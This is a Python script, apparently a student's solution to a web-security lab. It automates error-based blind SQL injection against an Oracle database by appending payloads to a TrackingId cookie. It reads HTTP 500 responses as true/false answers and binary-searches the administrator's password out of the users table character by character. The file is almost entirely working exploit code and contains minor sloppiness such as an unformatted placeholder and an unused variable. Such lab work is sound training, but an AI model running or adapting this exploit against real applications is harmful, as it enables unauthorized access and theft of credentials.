#!/home/student/scripts/.dev/bin/activate/python3

import requests
import questionary

# ------------------------------- config ------------------------------------

print(
    "hi! this is evaluating for a {databaseType} database. please adjust if need be...\n\n"
)

pwLength = 20

databaseType = "Oracle"
sessionCookie = input("paste the session cookie\n").strip()
trackingCookie = input("paste the tracking cookie\n").strip()
baseURL = input("paste the host/base url\n").strip()
oracle = 500
uri = input("paste the uri\n").strip()
url = baseURL + uri
# ---------------------------------------------------------------------------


def get_password_length():
    knowsPWLength = questionary.select(
        "do you know the password length?",
        choices=["yes", "no"],
    ).ask()
    if knowsPWLength == "no":
        pwLength = 20
    else:
        pwLength = input("please type the length (number): ").strip()
        pwLength = int(pwLength)

    return pwLength


def send_request(payload):
    """Append the SQL payload to the tracking cookie and send one request."""
    injected = trackingCookie + payload
    r = requests.get(
        url,
        cookies={"TrackingId": injected, "session": sessionCookie},
    )
    print(r.status_code)

    return r.status_code


def check_oracle(response):
    """True when the condition was true (error 500)."""
    return oracle == response


def test_condition(queryShell):
    """Wrap a SQL boolean condition in the injection and return the oracle result."""
    subQuery = "(ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)) < 0)"
    payload = f"{queryShell}"
    return check_oracle(send_request(payload))


def char_exists(pos):
    # ASCII('') is 0, so this goes false once we run past the last character.
    subQuery = f"(ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1)) > 0)"
    queryShell = f"' AND (SELECT CASE WHEN ({subQuery}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
    return test_condition(queryShell)


def get_char(pos):
    """Binary-search (the 'narrow' step) for the character at 1-indexed pos."""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        subQuery = f"(ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1)) > {mid})"
        queryShell = f"' AND (SELECT CASE WHEN ({subQuery}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
        if test_condition(queryShell):
            lo = mid + 1  # true value is higher than mid
        else:
            hi = mid  # true value is mid or lower
    return chr(lo)


def store_value(pwLength):
    """Walk each position, stop at end of string, build up the password."""
    recovered = ""
    for pos in range(1, pwLength + 1):
        if not char_exists(pos):
            print(f"[*] end of string at position {pos}")
            break
        c = get_char(pos)
        recovered += c
        print(f"[+] pos {pos:2d} = {c!r}  ->  {recovered}")
    return recovered


if __name__ == "__main__":
    pwLength = get_password_length()
    print("[*] recovered password:", store_value(pwLength))
